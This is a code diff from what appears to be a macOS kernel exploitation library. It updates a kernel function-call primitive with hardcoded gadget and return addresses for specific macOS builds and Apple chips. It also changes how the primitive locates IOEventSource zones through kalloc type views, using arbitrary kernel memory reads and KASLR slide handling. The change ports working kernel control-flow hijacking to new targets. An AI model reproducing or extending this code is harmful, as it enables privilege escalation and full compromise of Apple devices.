@@ -31,17 +31,18 @@
 
 #define STACK_SCAN_SIZE 8192
 
-#if defined(MACOS_21D49)
-#define ERET1_ENTRY 0xfffffe000724bc20
-#define ERET2_ENTRY 0xfffffe000725709c
-#define LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE 0xfffffe00079cbf84
-#define LR_BLOCK_RELEASE_HELPER 0xfffffe000795a328
-#elif defined(MACOS_21E5212f)
+#if defined(MACOS_21E5212f_T6000)
 #define ERET1_ENTRY 0xfffffe0007253c20
 #define ERET2_ENTRY 0xfffffe000725f09c
 #define LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE 0xfffffe00079df578
 #define LR_BLOCK_RELEASE_HELPER 0xfffffe000796cd04
 #define LR_IS_IO_CONNECT_METHOD 0xfffffe00073a9884 // _Xio_connect_method
+#elif defined(MACOS_21E230_T8101)
+#define ERET1_ENTRY 0xfffffe0007253c20
+#define ERET2_ENTRY 0xfffffe000725f07c
+#define LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE 0xfffffe00079defb4
+#define LR_BLOCK_RELEASE_HELPER 0xfffffe000796c740
+#define LR_IS_IO_CONNECT_METHOD 0xfffffe00073a9760 // _Xio_connect_method
 #else
 #error "unknown platform"
 #endif
@@ -95,9 +96,9 @@ xe_util_kfunc_t xe_util_kfunc_create(uint free_zone_idx) {
     uintptr_t free_zone = xe_util_zalloc_find_zone_at_index(free_zone_idx);
     xe_assert(xe_kmem_read_uint64(free_zone, 0) == 0);
     
-    xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE), 0), 1);
-    xe_util_zalloc_t reserved_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE_RESERVED), 0), 1);
-    xe_util_zalloc_t counter_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE_COUNTER), 0), 1);
+    xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_IO_EVENT_SOURCE_KTV), TYPE_KALLOC_TYPE_VIEW_MEM_KT_ZV_OFFSET), 1);
+    xe_util_zalloc_t reserved_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_IO_EVENT_SOURCE_RESERVED_KTV), TYPE_KALLOC_TYPE_VIEW_MEM_KT_ZV_OFFSET), 1);
+    xe_util_zalloc_t counter_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_IO_EVENT_SOURCE_COUNTER_KTV), TYPE_KALLOC_TYPE_VIEW_MEM_KT_ZV_OFFSET), 1);
     xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), 6144), 1);
     
     uintptr_t io_event_source = xe_util_zalloc_alloc(io_event_source_allocator, 0);
